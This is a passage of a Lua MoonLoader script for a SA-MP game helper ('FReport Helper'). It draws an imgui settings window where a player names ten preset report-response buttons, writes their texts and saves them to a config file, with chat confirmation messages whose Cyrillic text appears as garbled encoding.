	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.vosemtext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##vosemknop', text_buffer_vosemknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##vosemtext', text_buffer_vosemtext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#8 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_vosemknop.v == '' then 
cfg.settings.vosemknopka = u8"�8 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.vosemknopka = text_buffer_vosemknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.vosemknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#8 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_vosemtext.v == '' then 
cfg.settings.vosemtext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.vosemtext = text_buffer_vosemtext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.vosemtext), 0xffdead)
	end
	end
	
	imgui.Separator()
	--
		 	imgui.CenterTextColoredRGB('������  {ffdead}�9{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.devyatknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.devyattext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.devyattext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##devyatknop', text_buffer_devyatknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##devyattext', text_buffer_devyattext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#9 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_devyatknop.v == '' then 
cfg.settings.devyatknopka = u8"�9 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.devyatknopka = text_buffer_devyatknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.devyatknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	
if imgui.Button(u8'#9 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_devyattext.v == '' then 
cfg.settings.devyattext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.devyattext = text_buffer_devyattext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.devyattext), 0xffdead)
	end
	end
	
	imgui.Separator()
	--
			 	imgui.CenterTextColoredRGB('������  {ffdead}�10{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.desyatknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.desyattext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.desyattext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##desyatknop', text_buffer_desyatknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##desyattext', text_buffer_desyattext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#10 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_desyatknop.v == '' then 
cfg.settings.desyatknopka = u8"�10 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.desyatknopka = text_buffer_desyatknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.desyatknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	
if imgui.Button(u8'#10 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_desyattext.v == '' then 
cfg.settings.desyattext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.desyattext = text_buffer_desyattext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.desyattext), 0xffdead)
	end
	end
	
	imgui.SetCursorPosX(280)
	if imgui.Button(u8'�������� ��� ������', imgui.ImVec2(200, 20)) then
	cfg.settings.pervayaknopka = u8"�1 ����������������"
cfg.settings.pervayatext = none
cfg.settings.dvaknopka = u8"�2 ����������������"
cfg.settings.dvatext = none
cfg.settings.triknopka = u8"�3 ����������������"
cfg.settings.tritext = none
cfg.settings.chetiriknopka = u8"�4 ����������������"
cfg.settings.chetiritext = none
cfg.settings.pyatknopka = u8"�5 ����������������"
cfg.settings.pyattext = none
cfg.settings.shestknopka = u8"�6 ����������������"
cfg.settings.shesttext = none
cfg.settings.semknopka = u8"�7 ����������������"
cfg.settings.semtext = none
cfg.settings.vosemknopka = u8"�8 ����������������"
cfg.settings.vosemtext = none
cfg.settings.devyatknopka = u8"�9 ����������������"
cfg.settings.devyattext = none
cfg.settings.desyatknopka = u8"�10 ����������������"
cfg.settings.desyattext = none
inicfg.save(cfg, cfgConfig)
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� {32CD32}�������� {ffffff}�������� � ���� ���������������� ������.', 0xffdead)
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� {32CD32}���������� {ffffff}� ����������. ', 0xffdead)
	end
		imgui.EndChild()
		imgui.SetCursorPosX(125)
		--imgui.SetCursorPosY(370)
		if imgui.Button(u8"����� �� ������ ���������", imgui.ImVec2(530, 35)) then
		main_window_state.v = true
        
        	izmena.v = false
end
	

 
	imgui.End()

end

function otdelizmenarmenu()
	imgui.ShowCursor = true
 imgui.SetNextWindowSize(imgui.ImVec2(800, 528), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.Begin(u8"�������� �������� ������ | �������� �����", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize  + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{ffdead}����� ���������') imgui.PopFont()
		imgui.Separator()
		imgui.BeginChild("izmena", imgui.ImVec2(0, 430), true)
		imgui.CenterTextColoredRGB('������  {ffdead}�1{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.pervayaknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.pervayatext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.pervayatext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##odinknop', text_buffer_odinknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##odintext', text_buffer_odintext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#1 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_odinknop.v == '' then 
cfg.settings.pervayaknopka = u8"�1 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.pervayaknopka = text_buffer_odinknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.pervayaknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#1 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_odintext.v == '' then 
cfg.settings.pervayatext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.pervayatext = text_buffer_odintext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.pervayatext), 0xffdead)
	end
	end
	imgui.Separator()
	--------
	imgui.CenterTextColoredRGB('������  {ffdead}�2{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.dvaknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.dvatext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.dvatext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##dvaknop', text_buffer_dvaknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##dvatext', text_buffer_dvatext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#2 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_dvaknop.v == '' then 
cfg.settings.dvaknopka = u8"�2 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else
	cfg.settings.dvaknopka = text_buffer_dvaknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.dvaknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#2 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_dvatext.v == '' then 
cfg.settings.dvatext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.dvatext = text_buffer_dvatext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.dvatext), 0xffdead)
	end
	end
	------
	imgui.Separator()
	imgui.CenterTextColoredRGB('������  {ffdead}�3{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.triknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.tritext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.tritext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##triknop', text_buffer_triknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##tritext', text_buffer_tritext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#3 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_triknop.v == '' then 
cfg.settings.triknopka = u8"�3 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.triknopka = text_buffer_triknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.triknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#3 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_tritext.v == '' then 
cfg.settings.tritext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.tritext = text_buffer_tritext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.tritext), 0xffdead)
	end
	end
	imgui.Separator()
	--------
	imgui.CenterTextColoredRGB('������  {ffdead}�4{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.chetiriknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.chetiritext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.chetiritext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##chetiriknop', text_buffer_chetiriknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##chetiritext', text_buffer_chetiritext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#4 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_chetiriknop.v == '' then 
cfg.settings.chetiriknopka = u8"�4 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.chetiriknopka = text_buffer_chetiriknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.chetiriknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#4 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_chetiritext.v == '' then 
cfg.settings.chetiriext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.chetiritext = text_buffer_chetiritext.v
	inicfg.save(cfg, cfgConfig)
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.chetiritext), 0xffdead)
	end
	end
	imgui.Separator()
	---------
	imgui.CenterTextColoredRGB('������  {ffdead}�5{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.pyatknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.pyattext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.pyattext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##pyatknop', text_buffer_pyatknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##pyattext', text_buffer_pyattext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#5 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_pyatknop.v == '' then 
cfg.settings.pyatknopka = u8"�5 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.pyatknopka = text_buffer_pyatknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.pyatknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#5 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_pyattext.v == '' then 
cfg.settings.pyattext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.pyattext = text_buffer_pyattext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.pyattext), 0xffdead)
	end
	end
	imgui.Separator()
	
	--
	
	
	--
	imgui.CenterTextColoredRGB('������  {ffdead}�6{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.shestknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.shesttext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.shesttext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##shestknop', text_buffer_shestknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##shesttext', text_buffer_shesttext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#6 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_shestknop.v == '' then 
cfg.settings.shestknopka = u8"�6 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.shestknopka = text_buffer_shestknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.shestknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#6 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_shesttext.v == '' then 
cfg.settings.shesttext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.shesttext = text_buffer_shesttext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.shesttext), 0xffdead)
	end
	end
	imgui.Separator()
	--
	imgui.CenterTextColoredRGB('������  {ffdead}�7{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.semknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.semtext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.semtext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##semknop', text_buffer_semknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##semtext', text_buffer_semtext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#7 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_semknop.v == '' then 
cfg.settings.semknopka = u8"�7 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.semknopka = text_buffer_semknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.semknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#7 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_semtext.v == '' then 
cfg.settings.semtext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.semtext = text_buffer_semtext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.semtext), 0xffdead)
	end
	end
	
	imgui.Separator()
	--
	 	imgui.CenterTextColoredRGB('������  {ffdead}�8{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.vosemknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.vosemtext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.vosemtext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##vosemknop', text_buffer_vosemknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##vosemtext', text_buffer_vosemtext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#8 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_vosemknop.v == '' then 
cfg.settings.vosemknopka = u8"�8 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.vosemknopka = text_buffer_vosemknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.vosemknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#8 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_vosemtext.v == '' then 
cfg.settings.vosemtext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.vosemtext = text_buffer_vosemtext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.vosemtext), 0xffdead)
	end
	end
	
	imgui.Separator()
	--
		 	imgui.CenterTextColoredRGB('������  {ffdead}�9{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.devyatknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.devyattext == none then
